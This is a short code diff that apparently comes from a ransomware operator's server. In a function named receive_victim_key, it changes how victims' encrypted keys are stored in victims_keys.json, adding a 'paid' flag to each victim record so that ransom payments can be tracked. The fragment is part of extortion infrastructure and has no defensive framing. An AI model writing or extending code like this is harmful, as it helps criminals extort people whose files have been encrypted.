@@ -18,8 +18,11 @@ def receive_victim_key():
     except:
         victims = {}
 
-    # add new victim
-    victims[victim_id] = encrypted_key
+    # add new victim with paid = False
+    victims[victim_id] = {
+        'encrypted_key': encrypted_key,
+        'paid': False
+    }
 
     # save to file
     with open('victims_keys.json', 'w') as f:
